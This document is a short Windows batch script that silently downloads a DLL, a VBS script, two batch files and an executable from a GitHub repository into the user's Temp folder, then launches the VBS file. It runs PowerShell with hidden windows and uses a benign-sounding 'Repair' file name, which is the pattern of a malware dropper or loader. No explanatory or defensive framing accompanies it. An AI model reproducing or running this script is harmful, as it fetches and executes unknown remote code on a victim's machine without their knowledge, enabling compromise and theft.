@echo off
setlocal

set "USER=%USERNAME%"
set "TEMP_DIR=C:\Users\%USER%\AppData\Local\Temp"

set "DLL_URL=https://raw.githubusercontent.com/ofutpemata22/mamf/main/Repair.dll"
set "VBS_URL=https://raw.githubusercontent.com/ofutpemata22/mamf/main/main.vbs"
set "BAT_URL=https://raw.githubusercontent.com/ofutpemata22/mamf/main/1.bat"
set "BAT2_URL=https://github.com/ofutpemata22/mamf/raw/main/2.bat"
set "PCA_URL=https://github.com/ofutpemata22/mamf/raw/main/pca.exe"

set "DLL_PATH=%TEMP_DIR%\Repair.dll"
set "VBS_PATH=%TEMP_DIR%\main.vbs"
set "BAT_PATH=%TEMP_DIR%\1.bat"
set "BAT2_PATH=%TEMP_DIR%\2.bat"
set "PCA_PATH=%TEMP_DIR%\pca.exe"

powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DLL_URL%', '%DLL_PATH%')"
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%VBS_URL%', '%VBS_PATH%')"
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%BAT_URL%', '%BAT_PATH%')"
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%BAT2_URL%', '%BAT2_PATH%')"
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%PCA_URL%', '%PCA_PATH%')"

start "" "%VBS_PATH%"

endlocal
